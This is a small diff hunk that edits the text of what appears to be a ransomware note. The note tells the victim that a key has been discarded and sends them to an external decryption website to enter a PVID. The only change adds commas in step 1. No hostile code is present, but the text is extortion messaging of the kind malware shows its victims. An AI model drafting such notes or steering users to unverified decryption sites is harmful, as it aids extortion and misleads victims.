@@ -8,7 +8,7 @@ which has now been discarded from the system.
 To decrypt and restore your system, please follow these 4 simple
 steps:
 
-1) Swear on god that you will NOT fall for any more malware!
+1) Swear, on god, that you will NOT fall for any more malware!
 2) Go to https://decryptor.octobyte.cloud to generate your key.
 3) Enter your PVID via the provided website and the decryption key
 will be provided.
